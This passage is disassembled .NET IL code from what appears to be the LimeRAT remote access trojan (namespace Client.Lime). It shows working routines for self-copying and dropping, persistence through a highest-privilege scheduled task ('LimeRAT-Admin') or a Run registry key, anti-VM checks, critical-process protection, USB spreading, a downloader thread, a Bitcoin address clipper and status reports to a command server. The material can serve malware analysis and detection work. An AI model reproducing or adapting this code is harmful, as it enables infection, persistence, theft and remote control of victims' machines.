      IL_003c:  stloc.0
      IL_003d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0042:  leave.s    IL_0044

    }  // end handler
    IL_0044:  ldloc.0
    IL_0045:  ret
  } // end of method C_ID::Flood

  .method public static string  CPU_GPU() cil managed
  {
    // Code size       150 (0x96)
    .maxstack  3
    .locals init (string V_0,
             class [System.Management]System.Management.ManagementObject V_1,
             class [mscorlib]System.Exception V_2)
    .try
    {
      IL_0000:  ldstr      "Win32_Processor.deviceid=\"CPU0\""
      IL_0005:  newobj     instance void [System.Management]System.Management.ManagementObject::.ctor(string)
      IL_000a:  stloc.1
      IL_000b:  ldloc.1
      IL_000c:  callvirt   instance void [System.Management]System.Management.ManagementObject::Get()
      IL_0011:  ldloc.1
      IL_0012:  ldstr      "Name"
      IL_0017:  callvirt   instance object [System.Management]System.Management.ManagementBaseObject::get_Item(string)
      IL_001c:  callvirt   instance string [mscorlib]System.Object::ToString()
      IL_0021:  ldstr      "Intel"
      IL_0026:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_002b:  brfalse.s  IL_006d

      IL_002d:  ldloc.1
      IL_002e:  ldstr      "Name"
      IL_0033:  callvirt   instance object [System.Management]System.Management.ManagementBaseObject::get_Item(string)
      IL_0038:  callvirt   instance string [mscorlib]System.Object::ToString()
      IL_003d:  ldstr      "(R)"
      IL_0042:  ldstr      ""
      IL_0047:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_004c:  ldstr      "Core(TM)"
      IL_0051:  ldstr      ""
      IL_0056:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_005b:  ldstr      "CPU"
      IL_0060:  ldstr      ""
      IL_0065:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_006a:  stloc.0
      IL_006b:  leave.s    IL_0094

      IL_006d:  ldloc.1
      IL_006e:  ldstr      "Name"
      IL_0073:  callvirt   instance object [System.Management]System.Management.ManagementBaseObject::get_Item(string)
      IL_0078:  callvirt   instance string [mscorlib]System.Object::ToString()
      IL_007d:  stloc.0
      IL_007e:  leave.s    IL_0094

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0080:  dup
      IL_0081:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0086:  stloc.2
      IL_0087:  ldstr      "Unknow"
      IL_008c:  stloc.0
      IL_008d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0092:  leave.s    IL_0094

    }  // end handler
    IL_0094:  ldloc.0
    IL_0095:  ret
  } // end of method C_ID::CPU_GPU

  .method public static string  dotNET() cil managed
  {
    // Code size       130 (0x82)
    .maxstack  3
    .locals init (string V_0,
             class [mscorlib]System.Text.StringBuilder V_1,
             string[] V_2,
             int32 V_3,
             string V_4,
             class [mscorlib]System.Exception V_5)
    .try
    {
      IL_0000:  newobj     instance void [mscorlib]System.Text.StringBuilder::.ctor()
      IL_0005:  stloc.1
      IL_0006:  call       string [mscorlib]System.Runtime.InteropServices.RuntimeEnvironment::GetRuntimeDirectory()
      IL_000b:  ldc.i4.0
      IL_000c:  ldc.i4.s   34
      IL_000e:  callvirt   instance string [mscorlib]System.String::Substring(int32,
                                                                              int32)
      IL_0013:  call       string[] [mscorlib]System.IO.Directory::GetDirectories(string)
      IL_0018:  stloc.2
      IL_0019:  ldc.i4.0
      IL_001a:  stloc.3
      IL_001b:  br.s       IL_005c

      IL_001d:  ldloc.2
      IL_001e:  ldloc.3
      IL_001f:  ldelem.ref
      IL_0020:  stloc.s    V_4
      IL_0022:  ldloc.s    V_4
      IL_0024:  ldstr      "v4.0"
      IL_0029:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_002e:  brfalse.s  IL_003e

      IL_0030:  ldloc.1
      IL_0031:  ldstr      "v4.0"
      IL_0036:  callvirt   instance class [mscorlib]System.Text.StringBuilder [mscorlib]System.Text.StringBuilder::Append(string)
      IL_003b:  pop
      IL_003c:  br.s       IL_0058

      IL_003e:  ldloc.s    V_4
      IL_0040:  ldstr      "v2.0"
      IL_0045:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_004a:  brfalse.s  IL_0058

      IL_004c:  ldloc.1
      IL_004d:  ldstr      "v2.0 "
      IL_0052:  callvirt   instance class [mscorlib]System.Text.StringBuilder [mscorlib]System.Text.StringBuilder::Append(string)
      IL_0057:  pop
      IL_0058:  ldloc.3
      IL_0059:  ldc.i4.1
      IL_005a:  add.ovf
      IL_005b:  stloc.3
      IL_005c:  ldloc.3
      IL_005d:  ldloc.2
      IL_005e:  ldlen
      IL_005f:  conv.i4
      IL_0060:  blt.s      IL_001d

      IL_0062:  ldloc.1
      IL_0063:  callvirt   instance string [mscorlib]System.Text.StringBuilder::ToString()
      IL_0068:  stloc.0
      IL_0069:  leave.s    IL_0080

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_006b:  dup
      IL_006c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0071:  stloc.s    V_5
      IL_0073:  ldstr      "Error"
      IL_0078:  stloc.0
      IL_0079:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_007e:  leave.s    IL_0080

    }  // end handler
    IL_0080:  ldloc.0
    IL_0081:  ret
  } // end of method C_ID::dotNET

} // end of class Client.Lime.C_ID

.class public auto ansi Client.Lime.C_Installation
       extends [mscorlib]System.Object
{
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ret
  } // end of method C_Installation::.ctor

  .method public static void  INS() cil managed noinlining nooptimization
  {
    // Code size       190 (0xbe)
    .maxstack  10
    .locals init (object[] V_0,
             bool[] V_1)
    IL_0000:  ldsfld     bool Client.Lime.C_Settings::DROP
    IL_0005:  brfalse    IL_00b3

    IL_000a:  call       string [System.Windows.Forms]System.Windows.Forms.Application::get_ExecutablePath()
    IL_000f:  ldsfld     object Client.Lime.C_Settings::fullpath
    IL_0014:  ldc.i4.0
    IL_0015:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConditionalCompareObjectNotEqual(object,
                                                                                                                                        object,
                                                                                                                                        bool)
    IL_001a:  brfalse    IL_00bd

    .try
    {
      IL_001f:  call       void Client.Lime.C_Installation::Prepare()
      IL_0024:  ldsfld     object Client.Lime.C_Settings::fullpath
      IL_0029:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
      IL_002e:  call       void Client.Lime.C_Installation::AddDrop(string)
      IL_0033:  call       bool Client.Lime.C_ID::Privileges()
      IL_0038:  call       void Client.Lime.C_Installation::AddReg(bool)
      IL_003d:  ldsfld     class [mscorlib]System.Threading.Mutex Client.Lime.C_Settings::MTX
      IL_0042:  brfalse.s  IL_0054

      IL_0044:  ldsfld     class [mscorlib]System.Threading.Mutex Client.Lime.C_Settings::MTX
      IL_0049:  callvirt   instance void [mscorlib]System.Threading.WaitHandle::Close()
      IL_004e:  ldnull
      IL_004f:  stsfld     class [mscorlib]System.Threading.Mutex Client.Lime.C_Settings::MTX
      IL_0054:  call       void Client.Lime.C_CriticalProcess::CriticalProcesses_Disable()
      IL_0059:  ldnull
      IL_005a:  ldtoken    [System]System.Diagnostics.Process
      IL_005f:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
      IL_0064:  ldstr      "Start"
      IL_0069:  ldc.i4.1
      IL_006a:  newarr     [mscorlib]System.Object
      IL_006f:  dup
      IL_0070:  ldc.i4.0
      IL_0071:  ldsfld     object Client.Lime.C_Settings::fullpath
      IL_0076:  stelem.ref
      IL_0077:  dup
      IL_0078:  stloc.0
      IL_0079:  ldnull
      IL_007a:  ldnull
      IL_007b:  ldc.i4.1
      IL_007c:  newarr     [mscorlib]System.Boolean
      IL_0081:  dup
      IL_0082:  ldc.i4.0
      IL_0083:  ldc.i4.1
      IL_0084:  stelem.i1
      IL_0085:  dup
      IL_0086:  stloc.1
      IL_0087:  ldc.i4.1
      IL_0088:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                         class [mscorlib]System.Type,
                                                                                                                         string,
                                                                                                                         object[],
                                                                                                                         string[],
                                                                                                                         class [mscorlib]System.Type[],
                                                                                                                         bool[],
                                                                                                                         bool)
      IL_008d:  pop
      IL_008e:  ldloc.1
      IL_008f:  ldc.i4.0
      IL_0090:  ldelem.u1
      IL_0091:  brfalse.s  IL_00a0

      IL_0093:  ldloc.0
      IL_0094:  ldc.i4.0
      IL_0095:  ldelem.ref
      IL_0096:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_009b:  stsfld     object Client.Lime.C_Settings::fullpath
      IL_00a0:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
      IL_00a5:  leave.s    IL_00bd

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00a7:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00ac:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00b1:  leave.s    IL_00bd

    }  // end handler
    IL_00b3:  call       string [System.Windows.Forms]System.Windows.Forms.Application::get_ExecutablePath()
    IL_00b8:  stsfld     object Client.Lime.C_Settings::fullpath
    IL_00bd:  ret
  } // end of method C_Installation::INS

  .method private static void  Prepare() cil managed
  {
    // Code size       112 (0x70)
    .maxstack  3
    .try
    {
      IL_0000:  ldsfld     string Client.Lime.C_Settings::PATH1
      IL_0005:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
      IL_000a:  ldstr      "\\"
      IL_000f:  ldsfld     string Client.Lime.C_Settings::PATH2
      IL_0014:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0019:  call       bool [mscorlib]System.IO.Directory::Exists(string)
      IL_001e:  brtrue.s   IL_0041

      IL_0020:  ldsfld     string Client.Lime.C_Settings::PATH1
      IL_0025:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
      IL_002a:  ldstr      "\\"
      IL_002f:  ldsfld     string Client.Lime.C_Settings::PATH2
      IL_0034:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0039:  call       class [mscorlib]System.IO.DirectoryInfo [mscorlib]System.IO.Directory::CreateDirectory(string)
      IL_003e:  pop
      IL_003f:  br.s       IL_0061

      IL_0041:  ldsfld     object Client.Lime.C_Settings::fullpath
      IL_0046:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
      IL_004b:  call       bool [mscorlib]System.IO.File::Exists(string)
      IL_0050:  brfalse.s  IL_0061

      IL_0052:  ldsfld     object Client.Lime.C_Settings::fullpath
      IL_0057:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
      IL_005c:  call       void [mscorlib]System.IO.File::Delete(string)
      IL_0061:  leave.s    IL_006f

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0063:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0068:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_006d:  leave.s    IL_006f

    }  // end handler
    IL_006f:  ret
  } // end of method C_Installation::Prepare

  .method private static void  AddDrop(string Location) cil managed
  {
    // Code size       178 (0xb2)
    .maxstack  4
    .locals init (class [mscorlib]System.IO.FileStream V_0,
             uint8[] V_1,
             int32 V_2,
             int32 V_3,
             int32 V_4,
             class [mscorlib]System.IO.FileStream V_5)
    .try
    {
      IL_0000:  call       string [System.Windows.Forms]System.Windows.Forms.Application::get_ExecutablePath()
      IL_0005:  ldc.i4.3
      IL_0006:  ldc.i4.1
      IL_0007:  newobj     instance void [mscorlib]System.IO.FileStream::.ctor(string,
                                                                               valuetype [mscorlib]System.IO.FileMode,
                                                                               valuetype [mscorlib]System.IO.FileAccess)
      IL_000c:  stloc.0
      .try
      {
        IL_000d:  ldloc.0
        IL_000e:  callvirt   instance int64 [mscorlib]System.IO.FileStream::get_Length()
        IL_0013:  ldc.i4.1
        IL_0014:  conv.i8
        IL_0015:  sub.ovf
        IL_0016:  conv.ovf.i4
        IL_0017:  ldc.i4.1
        IL_0018:  add.ovf
        IL_0019:  newarr     [mscorlib]System.Byte
        IL_001e:  stloc.1
        IL_001f:  ldloc.0
        IL_0020:  callvirt   instance int64 [mscorlib]System.IO.FileStream::get_Length()
        IL_0025:  conv.ovf.i4
        IL_0026:  stloc.2
        IL_0027:  ldc.i4.0
        IL_0028:  stloc.3
        IL_0029:  br.s       IL_0044

        IL_002b:  ldloc.0
        IL_002c:  ldloc.1
        IL_002d:  ldloc.3
        IL_002e:  ldloc.2
        IL_002f:  callvirt   instance int32 [mscorlib]System.IO.FileStream::Read(uint8[],
                                                                                 int32,
                                                                                 int32)
        IL_0034:  stloc.s    V_4
        IL_0036:  ldloc.s    V_4
        IL_0038:  brfalse.s  IL_0048

        IL_003a:  ldloc.3
        IL_003b:  ldloc.s    V_4
        IL_003d:  add.ovf
        IL_003e:  stloc.3
        IL_003f:  ldloc.2
        IL_0040:  ldloc.s    V_4
        IL_0042:  sub.ovf
        IL_0043:  stloc.2
        IL_0044:  ldloc.2
        IL_0045:  ldc.i4.0
        IL_0046:  bgt.s      IL_002b

        IL_0048:  ldloc.1
        IL_0049:  ldlen
        IL_004a:  conv.i4
        IL_004b:  stloc.2
        IL_004c:  ldarg.0
        IL_004d:  ldc.i4.2
        IL_004e:  ldc.i4.2
        IL_004f:  newobj     instance void [mscorlib]System.IO.FileStream::.ctor(string,
                                                                                 valuetype [mscorlib]System.IO.FileMode,
                                                                                 valuetype [mscorlib]System.IO.FileAccess)
        IL_0054:  stloc.s    V_5
        .try
        {
          IL_0056:  ldloc.s    V_5
          IL_0058:  ldloc.1
          IL_0059:  ldc.i4.0
          IL_005a:  ldloc.2
          IL_005b:  callvirt   instance void [mscorlib]System.IO.FileStream::Write(uint8[],
                                                                                   int32,
                                                                                   int32)
          IL_0060:  ldloc.s    V_5
          IL_0062:  callvirt   instance void [mscorlib]System.IO.FileStream::Flush()
          IL_0067:  ldloc.s    V_5
          IL_0069:  callvirt   instance void [mscorlib]System.IO.Stream::Close()
          IL_006e:  leave.s    IL_007c

        }  // end .try
        finally
        {
          IL_0070:  ldloc.s    V_5
          IL_0072:  brfalse.s  IL_007b

          IL_0074:  ldloc.s    V_5
          IL_0076:  callvirt   instance void [mscorlib]System.IDisposable::Dispose()
          IL_007b:  endfinally
        }  // end handler
        IL_007c:  ldloc.0
        IL_007d:  callvirt   instance void [mscorlib]System.IO.FileStream::Flush()
        IL_0082:  ldloc.0
        IL_0083:  callvirt   instance void [mscorlib]System.IO.Stream::Close()
        IL_0088:  leave.s    IL_0094

      }  // end .try
      finally
      {
        IL_008a:  ldloc.0
        IL_008b:  brfalse.s  IL_0093

        IL_008d:  ldloc.0
        IL_008e:  callvirt   instance void [mscorlib]System.IDisposable::Dispose()
        IL_0093:  endfinally
      }  // end handler
      IL_0094:  ldsfld     object Client.Lime.C_Settings::fullpath
      IL_0099:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
      IL_009e:  call       void Client.Lime.C_Fuctions::DeleteZoneIdentifier(string)
      IL_00a3:  leave.s    IL_00b1

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00a5:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00aa:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00af:  leave.s    IL_00b1

    }  // end handler
    IL_00b1:  ret
  } // end of method C_Installation::AddDrop

  .method private static void  AddReg(bool Privileges) cil managed
  {
    // Code size       94 (0x5e)
    .maxstack  4
    .try
    {
      IL_0000:  ldarg.0
      IL_0001:  brfalse.s  IL_002c

      IL_0003:  ldstr      "schtasks /create /f /sc ONLOGON /RL HIGHEST /tn Li"
      + "meRAT-Admin /tr \"'"
      IL_0008:  ldsfld     object Client.Lime.C_Settings::fullpath
      IL_000d:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                             object)
      IL_0012:  ldstr      "'\""
      IL_0017:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                             object)
      IL_001c:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
      IL_0021:  ldc.i4.0
      IL_0022:  ldc.i4.0
      IL_0023:  ldc.i4.m1
      IL_0024:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_0029:  pop
      IL_002a:  br.s       IL_004f

      IL_002c:  ldsfld     class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.Registry::CurrentUser
      IL_0031:  ldstr      "Software\\Microsoft\\Windows\\CurrentVersion\\Run\\"
      IL_0036:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::CreateSubKey(string)
      IL_003b:  ldsfld     string Client.Lime.C_Settings::EXE
      IL_0040:  ldsfld     object Client.Lime.C_Settings::fullpath
      IL_0045:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_004a:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                         object)
      IL_004f:  leave.s    IL_005d

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0051:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0056:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_005b:  leave.s    IL_005d

    }  // end handler
    IL_005d:  ret
  } // end of method C_Installation::AddReg

} // end of class Client.Lime.C_Installation

.class public auto ansi beforefieldinit Client.Lime.C_Main
       extends [mscorlib]System.Object
{
  .field public static object SPL
  .method private specialname rtspecialname static 
          void  .cctor() cil managed
  {
    // Code size       11 (0xb)
    .maxstack  8
    IL_0000:  ldsfld     string Client.Lime.C_Settings::SPL
    IL_0005:  stsfld     object Client.Lime.C_Main::SPL
    IL_000a:  ret
  } // end of method C_Main::.cctor

  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ret
  } // end of method C_Main::.ctor

  .method public static void  Main() cil managed noinlining nooptimization
  {
    .entrypoint
    .custom instance void [mscorlib]System.STAThreadAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       262 (0x106)
    .maxstack  3
    .locals init (int32 V_0,
             bool V_1)
    .try
    {
      IL_0000:  ldsfld     int32 Client.Lime.C_Settings::Delay
      IL_0005:  stloc.0
      IL_0006:  br.s       IL_0016

      IL_0008:  ldc.i4     0x3e8
      IL_000d:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
      IL_0012:  ldloc.0
      IL_0013:  ldc.i4.1
      IL_0014:  sub.ovf
      IL_0015:  stloc.0
      IL_0016:  ldloc.0
      IL_0017:  brtrue.s   IL_0008

      IL_0019:  ldc.i4.0
      IL_001a:  stloc.1
      IL_001b:  ldc.i4.1
      IL_001c:  call       string Client.Lime.C_ID::HWID()
      IL_0021:  ldloca.s   V_1
      IL_0023:  newobj     instance void [mscorlib]System.Threading.Mutex::.ctor(bool,
                                                                                 string,
                                                                                 bool&)
      IL_0028:  stsfld     class [mscorlib]System.Threading.Mutex Client.Lime.C_Settings::MTX
      IL_002d:  ldloc.1
      IL_002e:  brtrue.s   IL_0035

      IL_0030:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
      IL_0035:  ldsfld     bool Client.Lime.C_Settings::ANTI
      IL_003a:  brfalse.s  IL_0041

      IL_003c:  call       void Client.Lime.C_AntiVM::Check()
      IL_0041:  call       void Client.Lime.C_Installation::INS()
      IL_0046:  ldsfld     class [mscorlib]System.Threading.Thread Client.Lime.C_TcpClient::T1
      IL_004b:  callvirt   instance void [mscorlib]System.Threading.Thread::Start()
      IL_0050:  ldsfld     bool Client.Lime.C_Settings::USB
      IL_0055:  brfalse.s  IL_006d

      IL_0057:  ldnull
      IL_0058:  ldftn      void Client.Lime.C_Main::StartSP()
      IL_005e:  newobj     instance void [mscorlib]System.Threading.ThreadStart::.ctor(object,
                                                                                       native int)
      IL_0063:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ThreadStart)
      IL_0068:  callvirt   instance void [mscorlib]System.Threading.Thread::Start()
      IL_006d:  ldsfld     bool Client.Lime.C_Settings::PIN
      IL_0072:  brfalse.s  IL_008a

      IL_0074:  ldnull
      IL_0075:  ldftn      void Client.Lime.C_Main::StartPIN()
      IL_007b:  newobj     instance void [mscorlib]System.Threading.ThreadStart::.ctor(object,
                                                                                       native int)
      IL_0080:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ThreadStart)
      IL_0085:  callvirt   instance void [mscorlib]System.Threading.Thread::Start()
      IL_008a:  ldnull
      IL_008b:  ldftn      void Client.Lime.C_Main::Checking()
      IL_0091:  newobj     instance void [mscorlib]System.Threading.ThreadStart::.ctor(object,
                                                                                       native int)
      IL_0096:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ThreadStart)
      IL_009b:  callvirt   instance void [mscorlib]System.Threading.Thread::Start()
      IL_00a0:  ldnull
      IL_00a1:  ldftn      void Client.Lime.C_Downloader::Downloader()
      IL_00a7:  newobj     instance void [mscorlib]System.Threading.ThreadStart::.ctor(object,
                                                                                       native int)
      IL_00ac:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ThreadStart)
      IL_00b1:  callvirt   instance void [mscorlib]System.Threading.Thread::Start()
      IL_00b6:  ldsfld     string Client.Lime.C_Settings::BTC_ADDR
      IL_00bb:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_00c0:  ldc.i4.s   25
      IL_00c2:  ble.s      IL_00e1

      IL_00c4:  ldnull
      IL_00c5:  ldftn      void Client.Lime.C_BTC::_BTC_ST()
      IL_00cb:  newobj     instance void [mscorlib]System.Threading.ThreadStart::.ctor(object,
                                                                                       native int)
      IL_00d0:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ThreadStart)
      IL_00d5:  dup
      IL_00d6:  ldc.i4.0
      IL_00d7:  callvirt   instance void [mscorlib]System.Threading.Thread::SetApartmentState(valuetype [mscorlib]System.Threading.ApartmentState)
      IL_00dc:  callvirt   instance void [mscorlib]System.Threading.Thread::Start()
      IL_00e1:  call       void Client.Lime.C_CriticalProcess::CriticalProcess_Enable()
      IL_00e6:  ldnull
      IL_00e7:  ldftn      void Client.Lime.C_Fuctions::Handler_SessionEnding(object,
                                                                              class [System]Microsoft.Win32.SessionEndingEventArgs)
      IL_00ed:  newobj     instance void [System]Microsoft.Win32.SessionEndingEventHandler::.ctor(object,
                                                                                                  native int)
      IL_00f2:  call       void [System]Microsoft.Win32.SystemEvents::add_SessionEnding(class [System]Microsoft.Win32.SessionEndingEventHandler)
      IL_00f7:  leave.s    IL_0105

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00f9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00fe:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0103:  leave.s    IL_0105

    }  // end handler
    IL_0105:  ret
  } // end of method C_Main::Main

  .method public static pinvokeimpl("coredll.dll" as "SystemIdleTimerReset" nomangle ansi lasterr winapi) 
          void  IdleTimerReset() cil managed preservesig
  {
  }
  .method private static void  Checking() cil managed
  {
    // Code size       461 (0x1cd)
    .maxstack  3
    .locals init (string V_0,
             string V_1,
             string V_2,
             string V_3,
             int32 V_4,
             class [mscorlib]System.Exception V_5,
             class [mscorlib]System.Exception V_6,
             class [mscorlib]System.Exception V_7,
             class [mscorlib]System.Exception V_8)
    IL_0000:  ldc.i4     0x1388
    IL_0005:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
    IL_000a:  call       object Client.Lime.C_ID::Rans()
    IL_000f:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
    IL_0014:  stloc.0
    IL_0015:  call       object Client.Lime.C_ID::USBSP()
    IL_001a:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
    IL_001f:  stloc.1
    IL_0020:  ldstr      "..."
    IL_0025:  stloc.2
    IL_0026:  call       object Client.Lime.C_ID::Flood()
    IL_002b:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
    IL_0030:  stloc.3
    IL_0031:  call       valuetype Client.Lime.C_Nosleep/EXECUTION_STATE Client.Lime.C_Nosleep::No_Sleep()
    IL_0036:  pop
    IL_0037:  ldc.i4.1
    IL_0038:  stloc.s    V_4
    IL_003a:  ldsfld     bool Client.Lime.C_TcpClient::isConnected
    IL_003f:  brfalse    IL_01be

    IL_0044:  ldc.i4     0xbb8
    IL_0049:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
    .try
    {
      IL_004e:  ldloc.0
      IL_004f:  ldstr      "Rans-Status"
      IL_0054:  call       string Client.Lime.C_Fuctions::GTV(string)
      IL_0059:  ldc.i4.0
      IL_005a:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_005f:  brfalse.s  IL_008b

      IL_0061:  ldstr      "Rans-Status"
      IL_0066:  call       string Client.Lime.C_Fuctions::GTV(string)
      IL_006b:  stloc.0
      IL_006c:  ldstr      "!R"
      IL_0071:  ldsfld     object Client.Lime.C_Main::SPL
      IL_0076:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                             object)
      IL_007b:  ldloc.0
      IL_007c:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                             object)
      IL_0081:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
      IL_0086:  call       void Client.Lime.C_TcpClient::Send(string)
      IL_008b:  leave.s    IL_009e

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_008d:  dup
      IL_008e:  ldloc.s    V_4
      IL_0090:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception,
                                                                                                                           int32)
      IL_0095:  stloc.s    V_5
      IL_0097:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_009c:  leave.s    IL_009e

    }  // end handler
    IL_009e:  nop
    .try
    {
      IL_009f:  ldsfld     bool Client.Lime.C_Settings::USB
      IL_00a4:  brfalse.s  IL_00e8

      IL_00a6:  ldloc.1
      IL_00a7:  ldstr      "USB"
      IL_00ac:  call       string Client.Lime.C_Fuctions::GTV(string)
      IL_00b1:  callvirt   instance string [mscorlib]System.String::ToString()
      IL_00b6:  ldc.i4.0
      IL_00b7:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_00bc:  brfalse.s  IL_00e8

      IL_00be:  ldstr      "USB"
      IL_00c3:  call       string Client.Lime.C_Fuctions::GTV(string)
      IL_00c8:  stloc.1
      IL_00c9:  ldstr      "!SP"
      IL_00ce:  ldsfld     object Client.Lime.C_Main::SPL
      IL_00d3:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                             object)
      IL_00d8:  ldloc.1
      IL_00d9:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                             object)
      IL_00de:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
      IL_00e3:  call       void Client.Lime.C_TcpClient::Send(string)
      IL_00e8:  leave.s    IL_00fb

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00ea:  dup
      IL_00eb:  ldloc.s    V_4
